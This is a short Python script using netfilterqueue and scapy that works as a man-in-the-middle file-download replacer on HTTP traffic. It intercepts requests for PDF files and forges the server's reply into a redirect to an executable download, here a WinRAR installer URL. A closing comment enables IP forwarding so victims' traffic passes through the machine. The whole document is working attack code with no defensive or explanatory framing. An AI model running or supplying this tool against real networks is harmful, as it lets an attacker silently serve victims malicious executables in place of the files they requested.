import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):
        if scapy_pkt[scapy.TCP].dport == 80:
            if ".pdf" in scapy_pkt[scapy.Raw].load:
                print "[+] PDF Request"
                ack_list.append(scapy_pkt[scapy.TCP].ack)
                print scapy_pkt.show()
        elif scapy_pkt[scapy.TCP].sport == 80:
            if scapy_pkt[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_pkt[scapy.TCP].seq)
                print "[+] Replacing File"
                scapy_pkt[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/predownload.html?spV=true&subD=true&f=winrar-x64-580.exe"
                del scapy_pkt[scapy.IP].len
                del scapy_pkt[scapy.IP].chksum
                del scapy_pkt[scapy.TCP].chksum
                print scapy_pkt.show()
                packet.set_payload(str(scapy_pkt))

    packet.accept()




queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#echo 1 > /proc/sys/net/ipv4/ip_forward